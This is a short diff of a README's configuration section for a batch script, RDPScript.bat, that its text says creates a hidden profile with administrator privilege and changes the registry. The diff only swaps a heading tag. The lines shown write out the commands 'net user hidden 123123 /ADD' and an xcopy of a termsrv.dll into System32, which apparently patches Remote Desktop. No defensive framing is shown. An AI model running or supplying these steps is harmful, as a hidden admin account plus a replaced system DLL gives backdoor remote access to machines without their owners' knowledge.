@@ -10,7 +10,7 @@ This script create a hidden profil ( Administrator privilege ) and change regist
 <h2>Configuration:</h2>
 You need to open RDPScript.bat <br />
 And make this changes :<br />
-<h3>net user hidden 123123 /ADD </h3><br />
+<h4>net user hidden 123123 /ADD </h4><br />
 hidden = name of your created account<br />
 123123 = password of your account <br />
 xcopy "termsrv.dll" "%windir%\System32\" /s /h /q <br />
